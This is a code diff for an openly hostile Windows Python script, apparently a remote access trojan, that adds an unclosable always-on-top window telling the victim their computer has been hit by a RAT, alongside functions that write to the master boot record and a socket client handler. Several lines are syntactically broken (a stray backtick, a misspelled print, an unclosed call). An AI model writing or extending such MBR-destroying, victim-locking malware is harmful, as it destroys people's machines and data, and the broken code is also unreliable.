@@ -1,23 +1,53 @@
+# IT IS RECOMMENDED TO RUN THIS CODE WITH ADMINISTRATOR(root)
+# (made for windows)
+
 import os 
+from os import system 
+# os.system('pip install tkinter') | install `tkinter`, but its a built-in Python module. it doesn't need to be installed using `pip`. In fact, trying to install it using `pip` will likely fail. But its here just incase
+# os.system('pip install ctypes') | is also a built-in Python module, so it doesn't need to be installed using `pip`. But is here just incase
+os.system('pip install pywin32')` # is a Windows-specific package and is required for this script to work.
 import time
 import socket
+import ctypes
+import keyboard
 import threading
+import tkinter as tk
 import subprocess
-from os import system 
-os.system('pip install pywin32')` # this is really a one time use software... so the script will auto install this to work properly 
 from win32file import * 
 from win32ui import * 
 from win32con import * 
 from win32gui import * 
 from sys import exit 
 
-def placeholder1(): # for extra destructive functions
-  print(" ")
-  print("I have been made known!")
+# |Working on this?|
+#  try:
+#     import tkinter as tk
+#     import ctypes
+#     import pywin32
+# except ImportError:
+#     print("Installing required packages...")
+#     os.system('pip install pywin32')
+#     import tkinter as tk
+#     import ctypes
+#     import pywin32
+#
+# |install 'pywin32' using subprocess|
+# import subprocess
+# subprocess.run(['pip', 'install', 'pywin32'])
 
-def placeholder2(): # for extra destructive functions
+def placeholder1(): # for extra destructive functions if any are wanted to be added
   print(" ")
   prnt("I have also been made known!")
+
+def unclosable(): # unclosable window 
+  root = tk.Tk()
+  root.title("WARNING (rat)") # display set-off message's title
+  root.attributes("-topmost", True)  # Make the window always on top
+  
+  label = tk.Label(root, text="Your computer has been affected by a RAT! The user has set off destructive code. May god bless your soul.", font=("Arial", 24))# display set-off message on the users pc
+  label.pack(pady=20)
+
+  root.protocol("WM_DELETE_WINDOW", lambda: None) # Make the window unclosable 
 
 def write_mbr(message):
     try:
@@ -53,7 +83,7 @@ def gods_wrath():
   warningdescription = 'err: your system ran into an error!'
   if MessageBox(warningdescription, warningtitle, MB_ICONWARNING | MB_YESNO) == 7:
     placeholder1()
-    placeholder2()
+    unclosable(
     mbr()
 
 def handle_client(client_socket):
